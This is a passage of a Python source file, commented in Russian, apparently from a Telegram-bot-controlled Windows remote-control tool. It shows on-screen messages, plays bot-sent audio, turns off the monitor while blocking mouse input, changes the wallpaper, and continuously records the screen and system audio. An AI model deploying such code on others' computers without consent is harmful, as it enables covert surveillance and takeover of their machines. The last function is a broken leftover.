                    MB_TOPMOST = 0x40000
                    MB_SETFOREGROUND = 0x10000
                    
                    def show_msgbox():
                        ctypes.windll.user32.MessageBoxW(
                            0, 
                            text, 
                            "Сообщение", 
                            MB_OK | MB_TOPMOST | MB_SETFOREGROUND
                        )
                    
                    # Показываем в отдельном потоке чтобы не блокировать
                    import threading
                    threading.Thread(target=show_msgbox, daemon=True).start()
                    
                    # Автоматически закрываем через timeout
                    def auto_close():
                        import time
                        time.sleep(timeout_ms / 1000)
                        try:
                            # Находим окно MessageBox и закрываем его
                            import win32gui
                            import win32con
                            hwnd = win32gui.FindWindow(None, "Сообщение")
                            if hwnd:
                                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                        except:
                            pass
                    
                    threading.Thread(target=auto_close, daemon=True).start()
                    logging.info("✅ Текст показан через MessageBox")
                    return
                except Exception as msgbox_err:
                    logging.debug(f"MessageBox failed: {msgbox_err}")
                
                # Метод 4: Просто логируем в консоль
                logging.info("="*70)
                logging.info(f"📢 СООБЩЕНИЕ ОТ БОТА:")
                logging.info(text)
                logging.info("="*70)
                print("\n" + "="*70)
                print(f"📢 СООБЩЕНИЕ ОТ БОТА:")
                print(text)
                print("="*70 + "\n")
                
            except Exception as e:
                logging.error(f"Overlay error: {e}")
                # Fallback - просто печатаем в консоль
                print("\n" + "="*70)
                print(f"📢 СООБЩЕНИЕ: {text}")
                print("="*70 + "\n")
        
        # Запускаем в отдельном потоке (НЕ daemon для корректной работы tkinter)
        thread = threading.Thread(target=_worker, daemon=False)
        thread.start()
        
    except Exception as e:
        logging.error(f"show_overlay_text error: {e}")
        # Последний fallback - просто печатаем
        print(f"\n📢 СООБЩЕНИЕ: {text}\n")

def _resample_to_rate(arr, src_rate: int, dst_rate: int):
    try:
        if arr is None or src_rate == dst_rate:
            return arr
        import numpy as _np
        n_src = arr.shape[0]
        n_dst = int(round(n_src * float(dst_rate) / float(src_rate)))
        if n_dst <= 0:
            return arr
        x = _np.linspace(0.0, 1.0, n_src, endpoint=False)
        xp = _np.linspace(0.0, 1.0, n_dst, endpoint=False)
        out = _np.zeros((n_dst, arr.shape[1]), dtype=_np.float32)
        for c in range(arr.shape[1]):
            out[:, c] = _np.interp(xp, x, arr[:, c]).astype(_np.float32)
        return out
    except Exception:
        return arr

def _download_tg_file(file_path: str) -> Optional[str]:
    try:
        if not file_path:
            return None
        import requests as _rq
        import tempfile
        url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        r = _rq.get(url, timeout=30)
        if not r.ok:
            return None
        tmpdir = os.getenv('TEMP') or tempfile.gettempdir()
        os.makedirs(tmpdir, exist_ok=True)
        ext = os.path.splitext(file_path)[1] or '.bin'
        p = os.path.join(tmpdir, f"tg_{int(time.time())}{ext}")
        with open(p, 'wb') as f:
            f.write(r.content)
        return p
    except Exception:
        return None

def play_audio_from_tg(file_path: str):
    try:
        p = _download_tg_file(file_path)
        if not p:
            logging.error("play_audio_from_tg: download failed")
            return
        import av as _av
        import numpy as _np
        import sounddevice as _sd
        c = _av.open(p)
        data = []
        src_rate = None
        chn = 2
        for packet in c.demux():
            if packet.stream.type != 'audio':
                continue
            for frame in packet.decode():
                try:
                    src_rate = frame.sample_rate or src_rate or 48000
                except Exception:
                    if src_rate is None:
                        src_rate = 48000
                try:
                    nd = frame.to_ndarray(format='flt')
                except Exception:
                    nd = frame.to_ndarray()
                if nd.ndim == 1:
                    nd = nd.reshape(1, -1)
                nd = nd.astype(_np.float32)
                nd = nd.T
                if nd.shape[1] == 1:
                    nd = _np.repeat(nd, 2, axis=1)
                elif nd.shape[1] > 2:
                    nd = nd[:, :2]
                data.append(nd)
        c.close()
        if not data:
            logging.error("play_audio_from_tg: no audio frames")
            return
        arr = _np.concatenate(data, axis=0)
        try:
            out_dev = _sd.default.device[1]
            out_info = _sd.query_devices(out_dev)
            out_sr = int(out_info.get('default_samplerate') or 48000)
        except Exception:
            out_sr = 48000
        arr = _resample_to_rate(arr, int(src_rate or 48000), out_sr)
        arr = _np.clip(arr, -1.0, 1.0).astype(_np.float32)
        # Play non-blocking to avoid freezes
        _sd.play(arr, out_sr, blocking=False)
        # Wait a bit for playback to start
        import time
        time.sleep(min(2.0, len(arr) / float(out_sr)))
    except Exception as e:
        logging.exception(f"play_audio_from_tg failed: {e}")

def monitor_off():
    try:
        logging.info("Выключение монитора...")
        HWND_BROADCAST = 0xFFFF
        WM_SYSCOMMAND = 0x0112
        SC_MONITORPOWER = 0xF170
        MONITOR_OFF = 2
        SMTO_NORMAL = 0x0000
        res = ctypes.c_ulong()
        ctypes.windll.user32.SendMessageTimeoutW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF, SMTO_NORMAL, 1000, ctypes.byref(res))
        # Дополнительно блокируем ввод, чтобы случайное движение мыши не будило экран
        try:
            block_mouse()
        except Exception:
            pass
        logging.info("Монитор выключен (ввод временно заблокирован)")
    except Exception as e:
        logging.error(f"Ошибка выключения монитора: {e}")

def monitor_on():
    try:
        logging.info("Включение монитора...")
        HWND_BROADCAST = 0xFFFF
        WM_SYSCOMMAND = 0x0112
        SC_MONITORPOWER = 0xF170
        MONITOR_ON = -1
        SMTO_NORMAL = 0x0000
        res = ctypes.c_ulong()
        ctypes.windll.user32.SendMessageTimeoutW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON, SMTO_NORMAL, 1000, ctypes.byref(res))
        try:
            unblock_mouse()
        except Exception:
            pass
        logging.info("Монитор включен, ввод разблокирован")
    except Exception as e:
        logging.error(f"Ошибка включения монитора: {e}")

def change_wallpaper(photo_data: bytes):
    try:
        import winreg
        logging.info("Смена обоев...")
        appdata = os.path.expandvars(r'%APPDATA%')
        themes_dir = os.path.join(appdata, 'Microsoft', 'Windows', 'Themes')
        try:
            os.makedirs(themes_dir, exist_ok=True)
        except Exception:
            pass
        wallpaper_path = os.path.join(themes_dir, 'TranscodedWallpaper')
        img = Image.open(io.BytesIO(photo_data))
        if img.mode not in ('RGB', 'BGR'):
            if img.mode in ('RGBA', 'LA', 'P'):
                rgb_img = Image.new('RGB', img.size, (0, 0, 0))
                if img.mode == 'P':
                    img = img.convert('RGBA')
                rgb_img.paste(img, mask=img.split()[-1] if img.mode in ('RGBA', 'LA') else None)
                img = rgb_img
            else:
                img = img.convert('RGB')
        bmp_path = wallpaper_path
        try:
            bmp_with_ext = os.path.join(themes_dir, 'telegram_wallpaper.bmp')
            img.save(bmp_with_ext, 'BMP')
            bmp_path = bmp_with_ext
        except Exception as e:
            logging.warning(f"Не удалось сохранить BMP с расширением: {e}")
            img.save(wallpaper_path, 'BMP')
        logging.info(f"Файл обоев сохранён: {bmp_path}")
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Control Panel\\Desktop', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'WallpaperStyle', 0, winreg.REG_SZ, '10')
            winreg.SetValueEx(key, 'TileWallpaper', 0, winreg.REG_SZ, '0')
            try:
                winreg.SetValueEx(key, 'Wallpaper', 0, winreg.REG_SZ, bmp_path)
            except Exception:
                pass
            winreg.CloseKey(key)
            logging.info("Реестр обновлён")
        except Exception as e:
            logging.warning(f"Не удалось обновить реестр: {e}")
        SPI_SETDESKWALLPAPER = 0x0014
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02
        result = ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, bmp_path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
        )
        if result:
            logging.info(f"Обои успешно изменены: {bmp_path}")
        else:
            error_code = ctypes.get_last_error()
            logging.error(f"SystemParametersInfoW вернула False, error code: {error_code}")
    except Exception as e:
        logging.exception(f"Критическая ошибка смены обоев: {e}")

def instant_replay_video_capture_loop():
    """Захват видео с JPEG компрессией для экономии памяти (95% меньше RAM!)"""
    global replay_video_buffer, replay_recording
    try:
        # Понижаем приоритет потока захвата, чтобы он меньше мешал системе
        set_current_thread_background_priority()
        import numpy as np
        import mss
        from PIL import Image as PILImage
        import io
        # Пытаемся использовать dxcam (GPU/Desktop Duplication) для захвата экрана
        try:
            import dxcam  # type: ignore
            camera = dxcam.create()
            use_dxcam = camera is not None
            if use_dxcam:
                logging.info("Instant Replay VIDEO: использую dxcam (GPU Desktop Duplication) для захвата экрана")
        except Exception as e:
            camera = None
            use_dxcam = False
            logging.info(f"Instant Replay VIDEO: dxcam недоступен, использую mss. Причина: {e}")
        
        logging.info("Instant Replay VIDEO: запуск захвата 1280x720 @ 30 FPS (с JPEG компрессией)...")
        replay_recording = True
        
        with mss.mss() as sct:
            monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
            
            # Для отрисовки курсора
            try:
                import win32api
                from PIL import ImageDraw
                cursor_available = True
            except:
                cursor_available = False
                logging.warning("win32api недоступен - курсор не будет отображаться")
            
            while replay_recording:
                try:
                    start_time = time.time()
                    if use_dxcam and camera is not None:
                        # Захват кадра через dxcam (numpy array).
                        # На практике dxcam возвращает RGB/RGBA, поэтому
                        # просто отбрасываем альфу (если есть) без перестановки каналов.
                        frame = camera.grab()
                        if frame is None:
                            time.sleep(1.0 / max(replay_fps, 1))
                            continue
                        try:
                            if frame.ndim == 3 and frame.shape[-1] == 4:
                                # RGBA -> RGB
                                frame_rgb = frame[:, :, :3]
                            else:
                                # Уже RGB
                                frame_rgb = frame
                        except Exception:
                            frame_rgb = frame
                        img = PILImage.fromarray(frame_rgb)
                    else:
                        # Стандартный путь через mss
                        screenshot = sct.grab(monitor)
                        img = PILImage.frombytes('RGB', screenshot.size, screenshot.rgb)
                    if img.size != (TARGET_WIDTH, TARGET_HEIGHT):
                        img = img.resize((TARGET_WIDTH, TARGET_HEIGHT), PILImage.BILINEAR)
                    
                    # Рисуем курсор поверх скриншота
                    # При dxcam аппаратный курсор, как правило, уже встроен в кадр,
                    # поэтому дополнительная отрисовка курсора не требуется.
                    if cursor_available and not use_dxcam:
                        try:
                            cursor_x, cursor_y = win32api.GetCursorPos()
                            # Масштабируем позицию курсора если разрешение изменено
                            scale_x = TARGET_WIDTH / screenshot.size[0]
                            scale_y = TARGET_HEIGHT / screenshot.size[1]
                            cursor_x = int(cursor_x * scale_x)
                            cursor_y = int(cursor_y * scale_y)
                            
                            # Рисуем простой курсор (белый круг с черной обводкой)
                            draw = ImageDraw.Draw(img)
                            r = 8  # радиус
                            draw.ellipse([cursor_x-r, cursor_y-r, cursor_x+r, cursor_y+r], 
                                       fill='white', outline='black', width=2)
                        except:
                            pass  # Игнорируем ошибки отрисовки курсора
                    
                    # ОПТИМИЗАЦИЯ: Сжимаем в JPEG БЕЗ optimize для скорости
                    # Используем цветовое субдискретизирование 4:2:0 (subsampling=2),
                    # что заметно снижает нагрузку при минимальной потере качества.
                    # Quality 70 — разумный баланс качество/нагрузка
                    jpeg_buffer = io.BytesIO()
                    img.save(jpeg_buffer, format='JPEG', quality=70, subsampling=2)
                    jpeg_bytes = jpeg_buffer.getvalue()
                    
                    ts = time.time()
                    with replay_lock:
                        # Сохраняем JPEG bytes вместо numpy array
                        replay_video_buffer.append((jpeg_bytes, ts))
                    
                    elapsed = time.time() - start_time
                    sleep_time = max(0, (1.0 / replay_fps) - elapsed)
                    if sleep_time > 0:
                        time.sleep(sleep_time)
                except Exception as e:
                    logging.error(f"Instant Replay VIDEO capture error: {e}")
                    time.sleep(1.0)
    except Exception as e:
        logging.exception(f"Instant Replay VIDEO loop failed: {e}")
        replay_recording = False

def try_wasapi_loopback():
    """НАСТОЯЩИЙ захват системного звука через PyAudioWPatch + WASAPI Loopback"""
    global replay_audio_buffer_out, replay_audio_recording_out, replay_audio_available_out
    
    try:
        # Снижаем приоритет аудио-потока, чтобы не мешать системе
        set_current_thread_background_priority()
        import pyaudiowpatch as pyaudio
        import numpy as np
        import time
        import threading
        
        logging.info("🔄 Пробую PyAudioWPatch для НАСТОЯЩЕГО захвата системного звука...")
        
        # Инициализируем PyAudio с WASAPI поддержкой
        p = pyaudio.PyAudio()
        
        # Ищем WASAPI loopback устройство (системный звук)
        wasapi_info = None
        try:
            # Получаем default loopback устройство (это и есть системный звук!)
            wasapi_info = p.get_default_wasapi_loopback()
            if wasapi_info:
                logging.info(f"✅ Найдено WASAPI Loopback устройство: {wasapi_info['name']}")
                logging.info(f"📊 Каналы: {wasapi_info['maxInputChannels']}, Sample Rate: {int(wasapi_info['defaultSampleRate'])}")
        except Exception as e:
            logging.warning(f"❌ WASAPI Loopback устройство не найдено: {e}")
            p.terminate()
            return False
        
        if not wasapi_info:
            logging.warning("❌ WASAPI Loopback недоступен")
            p.terminate()
            return False
        
        # Настраиваем параметры для WASAPI loopback
        channels = wasapi_info['maxInputChannels']
        if channels > 2:
            channels = 2  # Ограничиваем стерео
        
        sample_rate = int(wasapi_info['defaultSampleRate'])
        if sample_rate == 0:
            sample_rate = 44100  # Fallback
        
        logging.info(f"🎵 Настройка WASAPI Loopback: {channels}ch @ {sample_rate}Hz")
        
        # Открываем stream для WASAPI loopback
        try:
            # ИСПРАВЛЕНИЕ: Используем БЛОКИРУЮЩИЙ режим вместо callback
            # WASAPI Loopback лучше работает в блокирующем режиме
            chunk_size = 1024  # Меньший размер для лучшей отзывчивости
            
            stream = p.open(
                format=pyaudio.paInt16,
                channels=channels,
                rate=sample_rate,
                input=True,
                input_device_index=wasapi_info['index'],
                frames_per_buffer=chunk_size,
                # НЕ используем callback - блокирующий режим!
            )
            
            logging.info("🎵 WASAPI Loopback stream открыт в блокирующем режиме")
            
            # Запускаем отдельный поток для чтения WASAPI
            def wasapi_read_thread():
                global replay_audio_available_out, replay_audio_recording_out
                
                chunks_read = 0
                last_log_time = time.time()
                
                try:
                    replay_audio_available_out = True
                    replay_audio_recording_out = True
                    
                    logging.info("✅ WASAPI Loopback поток запущен! Начинаю чтение системного звука...")
                    
                    while replay_audio_recording_out:
                        try:
                            # Читаем данные из stream (БЛОКИРУЮЩЕЕ чтение)
                            data = stream.read(chunk_size, exception_on_overflow=False)
                            
                            if data and len(data) > 0:
                                chunks_read += 1
                                
                                # Логируем первые несколько успешных чтений
                                if chunks_read <= 3:
                                    logging.info(f"📊 WASAPI чтение #{chunks_read}: получено {len(data)} байт")
                                
                                # Конвертируем в numpy
                                audio_data = np.frombuffer(data, dtype=np.int16)
                                audio_data = audio_data.astype(np.float32) / 32768.0
                                
                                # Преобразуем в стерео если нужно
                                if channels == 2:
                                    audio_data = audio_data.reshape(-1, 2)
                                else:
                                    audio_data = np.repeat(audio_data.reshape(-1, 1), 2, axis=1)
                                
                                # Добавляем в буфер
                                with replay_audio_lock_out:
                                    replay_audio_buffer_out.append(audio_data)
                                
                                # Периодически логируем статус
                                now = time.time()
                                if now - last_log_time > 30:  # Каждые 30 секунд
                                    buffer_size = len(replay_audio_buffer_out)
                                    logging.debug(f"WASAPI: прочитано {chunks_read} чанков, буфер={buffer_size}")
                                    last_log_time = now
                            else:
                                # Пустые данные - возможно нет активного аудио
                                if chunks_read == 0:
                                    time.sleep(0.1)
                                
                        except OSError as e:
                            # Обработка overflow и других OS ошибок
                            if "Input overflowed" in str(e):
                                logging.debug("WASAPI: input overflow (пропуск буфера)")
                            else:
                                if replay_audio_recording_out and chunks_read == 0:
                                    logging.warning(f"WASAPI read OS error: {e}")
                            time.sleep(0.01)
                        except Exception as e:
                            if replay_audio_recording_out and chunks_read == 0:
                                logging.warning(f"WASAPI read error: {type(e).__name__}: {e}")
                            time.sleep(0.01)
                            
                except Exception as e:
                    logging.error(f"WASAPI thread critical error: {e}")
                    import traceback
                    traceback.print_exc()
                finally:
                    logging.info(f"WASAPI поток завершен (прочитано {chunks_read} чанков)")
                    try:
                        stream.stop_stream()
                        stream.close()
                    except:
                        pass
                    try:
                        p.terminate()
                    except:
                        pass
            
            # Запускаем поток чтения
            read_thread = threading.Thread(target=wasapi_read_thread, daemon=True)
            read_thread.start()
            
            # Ждем немного чтобы убедиться что захват начался
            time.sleep(0.5)
            
            # Проверяем что данные поступают (проверяем несколько раз)
            for check_attempt in range(3):
                time.sleep(0.5)
                buffer_size = len(replay_audio_buffer_out)
                
                if buffer_size > 0:
                    logging.info(f"✅ WASAPI Loopback работает! Буфер: {buffer_size} чанков системного звука")
                    logging.info("💡 Системный звук успешно захватывается в реальном времени")
                    return True
            
            # Данных нет после нескольких проверок
            buffer_size = len(replay_audio_buffer_out)
            if buffer_size == 0:
                logging.warning(f"⚠️ WASAPI stream работает, но аудио данных нет")
                logging.info("💡 Причины: нет активного воспроизведения звука или звук заглушен")
                logging.info("💡 Instant Replay захватит звук когда начнется воспроизведение")
                # Все равно считаем успехом - данные появятся при воспроизведении
                return True
            else:
                logging.info(f"✅ WASAPI работает (буфер: {buffer_size})")
                return True
                
        except Exception as e:
            logging.warning(f"❌ Ошибка открытия WASAPI stream: {e}")
            p.terminate()
            return False
        
        logging.warning("❌ WASAPI Loopback не дал результатов")
        p.terminate()
        return False
        
    except Exception as e:
        logging.warning(f"❌ WASAPI Loopback failed: {e}")
        return False

def try_enable_stereo_mix():
    """Автоматическое включение Stereo Mix через PowerShell"""
    try:
        import subprocess
        import time
        
        logging.info("🔄 Попытка автоматически включить Stereo Mix...")
        
        # PowerShell команды для включения Stereo Mix
        powershell_commands = [
            # Включить отключенные аудио устройства
            "Get-AudioDevice -RecordingVolume | Where-Object {$_.Name -like '*Stereo*' -or $_.Name -like '*Mix*'} | Enable-AudioDevice",
            "Get-AudioDevice -RecordingVolume | Where-Object {$_.Name -like '*What*You*Hear*'} | Enable-AudioDevice",
            # Установить Stereo Mix как устройство по умолчанию
            "Get-AudioDevice -RecordingVolume | Where-Object {$_.Name -like '*Stereo*' -or $_.Name -like '*Mix*'} | Set-AudioDevice -Default",
        ]
        
        for cmd in powershell_commands:
            try:
                result = subprocess.run(
                    ['powershell', '-Command', cmd],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                if result.returncode == 0:
                    logging.info(f"✅ PowerShell команда выполнена: {cmd[:50]}...")
                else:
                    logging.debug(f"PowerShell failed: {result.stderr}")
            except Exception as e:
                logging.debug(f"PowerShell error: {e}")
        
        # Небольшая пауза для применения изменений
        time.sleep(2.0)
        logging.info("✅ Попытка включения Stereo Mix завершена")
        return True
        
    except Exception as e:
        logging.warning(f"❌ Автоматическое включение Stereo Mix failed: {e}")
        return False

def try_output_device_loopback():
    """Захват через output устройства с программным loopback"""
    global replay_audio_buffer_out, replay_audio_recording_out, replay_audio_available_out
    
    try:
        # Микрофонный поток тоже уводим в фон
        set_current_thread_background_priority()
        import sounddevice as sd
        import numpy as np
        import time
        
        logging.info("🔄 Пробую output устройства с software loopback...")
        
        # Находим output устройства (динамики/наушники)
        devices = sd.query_devices()
        output_devices = []
        
        for i, device in enumerate(devices):
            if device.get('max_output_channels', 0) > 0:
                name = device.get('name', '').lower()
                if 'dynamic' not in name and 'usb' in name:  # Приоритет USB устройствам
                    output_devices.insert(0, (i, device['name']))
                else:
                    output_devices.append((i, device['name']))
        
        # Output loopback в реальности не работает через input stream
        logging.info("❌ Output loopback невозможен - нельзя записывать с output устройств")
        return False
        
        # Пытаемся создать loopback через output устройства
        for device_idx, device_name in output_devices[:3]:  # Пробуем первые 3
            try:
                logging.info(f"🎵 Тестирую output loopback: {device_name}")
                
                # НЕ РАБОТАЕТ - нельзя создать InputStream с output устройством
                continue
                
                def output_callback(indata, frames, time_info, status):
                    chunk = indata.copy().astype('float32')
                    if len(chunk.shape) == 1:
                        chunk = np.repeat(chunk.reshape(-1, 1), 2, axis=1)
                    
                    with replay_audio_lock_out:
                        replay_audio_buffer_out.append(chunk)
                        if len(replay_audio_buffer_out) > replay_max_audio_chunks:
                            replay_audio_buffer_out.pop(0)
                
                stream.callback = output_callback
                stream.start()
                time.sleep(1.5)
                
                if len(replay_audio_buffer_out) > 2:
                    logging.info(f"✅ Output loopback работает: {device_name}")
                    replay_audio_available_out = True
                    replay_audio_recording_out = True
                    
                    while replay_audio_recording_out:
                        time.sleep(1.0)
                    
                    stream.stop()
                    stream.close()
                    return True
                
                stream.stop()
                stream.close()
                
            except Exception as e:
                logging.debug(f"Output device {device_name} failed: {e}")
                continue
        
        return False
        
    except Exception as e:
        logging.debug(f"Output loopback failed: {e}")
        return False

def try_virtual_audio_mixer():
    """Упрощенная проверка - виртуальный микшер не нужен"""
    logging.info("🔄 Виртуальный аудио микшер...")
    logging.info("❌ Виртуальный микшер не может захватить реальный системный звук")
    return False

def try_directsound_loopback():
    """Упрощенная проверка - DirectSound не работает без специальных драйверов"""
    logging.info("🔄 DirectSound loopback...")
    logging.info("❌ DirectSound требует специальные драйверы для loopback")
    return False

def instant_replay_audio_loopback_loop():
    """Захват системного звука через WASAPI или Stereo Mix"""
    global replay_audio_buffer_out, replay_audio_recording_out, replay_audio_available_out
    
    logging.info("🔊 Запуск захвата системного звука...")
    replay_audio_recording_out = True
    replay_audio_available_out = False
    
    # Приоритет 1: WASAPI Loopback (лучший метод)
    if try_wasapi_loopback():
        logging.info("✅ Системный звук через WASAPI Loopback")
        return
    
    logging.info("⚠️ WASAPI недоступен, пробую Stereo Mix через sounddevice...")
    
    try:
        import sounddevice as sd
        import numpy as np
        import time
        
        # Метод 1: Поиск Stereo Mix устройств
        def find_system_audio_devices():
            devices = sd.query_devices()
            system_devices = []
            
            # Поиск системных аудио устройств (без излишних логов)
            logging.debug(f"Найдено аудио устройств: {len(devices)}")
            
            for i, device in enumerate(devices):
                name = device.get('name', '').lower()
                max_in = device.get('max_input_channels', 0)
                
                if max_in > 0:  # Устройство может записывать
                    # Приоритетные ключевые слова для системного звука
                    priority_keywords = [
                        'stereo mix', 'stereomix', 'стерео микшер', 'стереомикшер',
                        'what u hear', 'what you hear', 'loopback', 'mix',
                        'virtual audio cable', 'vac', 'cable', 'virtual'
                    ]
                    
                    # ИСКЛЮЧЕНИЯ - устройства которые НЕ являются системным звуком
                    exclude_keywords = [
                        'микрофон', 'microphone', 'mic', 'переназначение', 'redirection',
                        'input', 'линейный вход', 'line in', 'aux', 'webcam', 'веб-камера',
                        'первичный драйвер', 'primary driver', 'первичный драйв',
                        'реалтек', 'realtek', 'звуковая карта', 'sound card',
                        'встроенное аудио', 'built-in audio', 'динамик', 'speaker'
                    ]
                    
                    # Проверяем что это НЕ исключенное устройство
                    is_excluded = any(keyword in name for keyword in exclude_keywords)
                    
                    if is_excluded:
                        # Пропускаем без логирования (слишком много устройств)
                        continue
                    
                    # Проверяем приоритетные устройства
                    is_priority = any(keyword in name for keyword in priority_keywords)
                    
                    if is_priority:
                        system_devices.insert(0, (i, device['name'], max_in, 'high_priority'))
                        logging.info(f"🎵 Найдено приоритетное устройство: {device['name']} (idx={i})")
                    else:
                        # Только добавляем если это может быть системный звук
                        if not any(word in name for word in ['микрофон', 'microphone', 'mic']):
                            system_devices.append((i, device['name'], max_in, 'normal'))
                            logging.info(f"🔍 Возможное системное устройство: {device['name']} (idx={i})")
                        
            return system_devices
        
        # Функция обработки аудио
        def system_audio_callback(indata, frames, time_info, status):
            if status:
                # Игнорируем overflow - это нормально для системного звука
                if 'overflow' not in str(status).lower():
                    logging.debug(f"System audio status: {status}")
            
            # Преобразуем аудио в стерео float32
            chunk = indata.copy().astype('float32')
            
            # Обеспечиваем стерео формат
            if len(chunk.shape) == 1:
                # Моно -> стерео
                chunk = np.repeat(chunk.reshape(-1, 1), 2, axis=1)
            elif chunk.shape[1] == 1:
                # Моно -> стерео
                chunk = np.repeat(chunk, 2, axis=1)
            elif chunk.shape[1] > 2:
                # Многоканальный -> стерео (берем первые 2 канала)
                chunk = chunk[:, :2]
            
            # Нормализация громкости (избегаем перегрузок)
            chunk = np.clip(chunk * 0.8, -1.0, 1.0)
            
            # Добавляем в буфер
            with replay_audio_lock_out:
                replay_audio_buffer_out.append(chunk)
                if len(replay_audio_buffer_out) > replay_max_audio_chunks:
                    replay_audio_buffer_out.pop(0)
        
        # Получаем список устройств
        devices = find_system_audio_devices()
        
        if not devices:
            logging.warning("🔊 Не найдено подходящих системных аудио устройств")
            logging.info("🔄 АВТОМАТИЧЕСКОЕ РЕШЕНИЕ: Попытка использовать WASAPI Loopback...")
            
            # Пробуем автоматические методы получения системного звука
            if try_wasapi_loopback():
                return  # Успешно подключились через WASAPI
            elif try_enable_stereo_mix():
                # Stereo Mix может быть включен, но требуется перезагрузка аудио сервиса
                logging.warning("❌ Не удалось автоматически включить Stereo Mix")
                # Не проверяем повторно - устройство не появится без перезагрузки
            
            if not devices:
                logging.info("🔄 ДОПОЛНИТЕЛЬНЫЕ АВТОМАТИЧЕСКИЕ МЕТОДЫ...")
                
                # Метод 3: Попытка захвата через output устройства с loopback
                if try_output_device_loopback():
                    return
                
                # Метод 4: Создание виртуального аудио микшера
                if try_virtual_audio_mixer():
                    return
                
                # Метод 5: DirectSound loopback захват
                if try_directsound_loopback():
                    return
                
                # Финальное решение: признать что системного звука нет
                logging.info("🔄 ФИНАЛЬНОЕ РЕШЕНИЕ: Системный звук недоступен")
                logging.info("✅ Instant replay будет содержать только микрофон (это нормально)")
                logging.info("💡 Для системного звука нужно включить Stereo Mix вручную в Windows")
                replay_audio_available_out = False
                return
        
        logging.info(f"🔍 Найдено {len(devices)} потенциально подходящих устройств для системного звука")
        
        # Пробуем устройства по приоритету
        for device_idx, device_name, max_channels, priority in devices:
            if not replay_audio_recording_out:
                break
                
            try:
                logging.info(f"🎵 Тестирую устройство: {device_name} ({priority})")
                
                # Определяем оптимальное количество каналов
                channels = min(2, max_channels) if max_channels > 0 else 1
                
                # Создаем аудио поток
                stream = sd.InputStream(
                    device=device_idx,
                    channels=channels,
                    samplerate=replay_audio_rate,
                    blocksize=replay_audio_chunk,
                    dtype='float32',
                    callback=system_audio_callback,
                    latency='low'  # Низкая задержка
                )
                
                # Пробуем запустить поток
                stream.start()
                
                # Тестовый период - слушаем 3 секунды для анализа качества
                time.sleep(3.0)
                
                # Проверяем что данные поступают
                buffer_size = len(replay_audio_buffer_out)
                if buffer_size > 5:  # Минимум 5 чанков за 3 секунды
                    # АНАЛИЗ КАЧЕСТВА ЗВУКА - проверяем что это не шум
                    quality_ok = False
                    try:
                        # Берем последние 10 чанков для анализа
                        recent_chunks = replay_audio_buffer_out[-10:] if len(replay_audio_buffer_out) >= 10 else replay_audio_buffer_out
                        
                        if recent_chunks:
                            # Объединяем чанки для анализа
                            combined_audio = np.concatenate(recent_chunks, axis=0)
                            
                            # Проверяем уровень сигнала
                            rms_level = np.sqrt(np.mean(combined_audio**2))
                            max_level = np.max(np.abs(combined_audio))
                            
                            # Проверяем динамический диапазон (разность между тихими и громкими моментами)
                            dynamic_range = np.max(combined_audio) - np.min(combined_audio)
                            
                            # Критерии качества звука:
                            # 1. RMS уровень не должен быть слишком низким (тишина) или слишком высоким (перегрузка)
                            # 2. Максимальный уровень не должен быть постоянно на пределе (клиппинг)
                            # 3. Должен быть приемлемый динамический диапазон
                            
                            if 0.001 < rms_level < 0.8 and max_level < 0.95 and dynamic_range > 0.01:
                                quality_ok = True
                                logging.info(f"🎵 КАЧЕСТВО ЗВУКА: RMS={rms_level:.4f}, MAX={max_level:.4f}, RANGE={dynamic_range:.4f}")
                            else:
                                logging.warning(f"🔇 ПЛОХОЕ КАЧЕСТВО: RMS={rms_level:.4f}, MAX={max_level:.4f}, RANGE={dynamic_range:.4f}")
                                if rms_level <= 0.001:
                                    logging.warning("❌ Слишком тихо - возможно тишина или неактивное устройство")
                                elif rms_level >= 0.8:
                                    logging.warning("❌ Слишком громко - возможна перегрузка или шум")
                                elif max_level >= 0.95:
                                    logging.warning("❌ Клиппинг - сигнал обрезается")
                                elif dynamic_range <= 0.01:
                                    logging.warning("❌ Нет динамики - возможно статический шум")
                    except Exception as e:
                        logging.warning(f"Ошибка анализа качества звука: {e}")
                        quality_ok = False
                    
                    if quality_ok:
                        logging.info(f"✅ Системный звук успешно захвачен: {device_name}")
                        logging.info(f"📊 Буфер содержит {buffer_size} аудио чанков ХОРОШЕГО КАЧЕСТВА")
                        replay_audio_available_out = True
                    else:
                        logging.warning(f"❌ Устройство {device_name} дает некачественный звук (возможно шум)")
                        stream.stop()
                        stream.close()
                        # Очищаем буфер от плохого звука
                        with replay_audio_lock_out:
                            replay_audio_buffer_out.clear()
                        continue
                    
                    # Держим поток активным
                    while replay_audio_recording_out:
                        time.sleep(1.0)
                    
                    stream.stop()
                    stream.close()
                    return  # Успешно завершили
                else:
                    logging.warning(f"❌ Устройство {device_name} не дает аудио данных (буфер: {buffer_size})")
                    stream.stop()
                    stream.close()
                
            except Exception as e:
                logging.warning(f"❌ Ошибка с устройством {device_name}: {e}")
                continue
        
        # Если ничего не сработало
        logging.warning("🔊 Не удалось подключиться ни к одному системному устройству")
        logging.info("💡 Совет: Включите 'Stereo Mix' в настройках Windows:")
        logging.info("   1. Панель управления → Звук → Запись")
        logging.info("   2. Правый клик → Показать отключенные устройства")
        logging.info("   3. Включить 'Stereo Mix' → Использовать по умолчанию")
        
        replay_audio_available_out = False
        
    except Exception as e:
        logging.exception(f"System audio capture failed: {e}")
        replay_audio_available_out = False
    finally:
        replay_audio_recording_out = False

def instant_replay_audio_loopback_loop_old():
        
        for i, device in enumerate(devices):
            name = device.get('name', '').lower()
            max_in = device.get('max_input_channels', 0)
            
            if max_in > 0:  # Устройство может записывать
                all_input_devices.append((i, device['name'], max_in))
                
                # Приоритетные устройства для системного звука
                if any(keyword in name for keyword in [
                    'stereo mix', 'стерео', 'what u hear', 'loopback', 
                    'cable', 'virtual', 'mix', 'микшер'
                ]):
                    stereo_mix_devices.append((i, device['name'], max_in))
